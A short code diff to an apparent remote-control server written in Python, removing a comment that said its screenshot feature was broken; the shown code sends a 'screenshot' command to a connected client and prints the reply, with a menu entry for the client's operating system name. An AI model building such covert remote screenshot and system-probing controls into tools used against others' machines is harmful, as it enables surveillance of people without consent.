@@ -36,7 +36,6 @@ class Server():
         else:
             # Screenshot
             if choice==1:
-                # Screenshot Functionality Isn't Working
                 self.c.send("screenshot".encode())
                 print(self.c.recv(1024))
             # Operating System Name
